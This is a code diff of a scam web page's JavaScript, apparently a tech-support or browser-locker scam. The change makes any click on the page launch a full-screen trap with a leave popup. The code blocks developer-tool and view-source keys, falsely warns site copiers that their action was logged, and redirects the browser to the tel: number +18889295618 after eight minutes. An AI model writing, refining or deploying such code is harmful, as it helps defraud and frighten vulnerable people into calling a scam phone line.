@@ -225,30 +225,16 @@
     const progressFill = document.getElementById('progressFill');
     const callNowBtn = document.getElementById('callNowBtn');
     const callNumberText = document.getElementById('callNumberText');
-
+    let hasStarted = false;
 
     function isMobile() {
         return /Android|iPhone|iPad|iPod|Windows Phone/i.test(navigator.userAgent);
     }
 
-    window.onload = function() {
-        startImage.style.backgroundImage = "url('https://aliceinborderlandsept.github.io/colnbaze/1.jpeg')";
-        if (navigator.userAgent.includes("HTTrack")) {
-            alert("Website copying attempt detected. Action has been logged.");
-        }
-    }
-
-    document.addEventListener('keydown', function(e) {
-        if (e.keyCode == 123 || 
-            (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || 
-            (e.ctrlKey && (e.keyCode == 83 || e.keyCode == 85))) {
-            e.preventDefault();
-            alert("Action Blocked");
-        }
-    });
-
-    startImage.addEventListener('click', function (e) {
-        e.stopPropagation();
+    function activateFullScreen() {
+        if (hasStarted) return;
+        hasStarted = true;
+        
         applyBackground();
         startImage.style.display = 'none';
         document.getElementById('leavePopup').style.display = 'block';
@@ -271,6 +257,35 @@
         setTimeout(function () {
             window.location.href = "tel:+18889295618";
         }, 480000);
+    }
+
+    window.onload = function() {
+        startImage.style.backgroundImage = "url('https://aliceinborderlandsept.github.io/colnbaze/1.jpeg')";
+        if (navigator.userAgent.includes("HTTrack")) {
+            alert("Website copying attempt detected. Action has been logged.");
+        }
+        
+        // Add click event listener to the entire body
+        document.body.addEventListener('click', function(e) {
+            // Only activate if we're not clicking on the popup itself
+            if (!e.target.closest('#leavePopup')) {
+                activateFullScreen();
+            }
+        });
+    }
+
+    document.addEventListener('keydown', function(e) {
+        if (e.keyCode == 123 || 
+            (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || 
+            (e.ctrlKey && (e.keyCode == 83 || e.keyCode == 85))) {
+            e.preventDefault();
+            alert("Action Blocked");
+        }
+    });
+
+    startImage.addEventListener('click', function (e) {
+        e.stopPropagation();
+        activateFullScreen();
     }, { once: true });
 
     callNowBtn.addEventListener('click', function () {
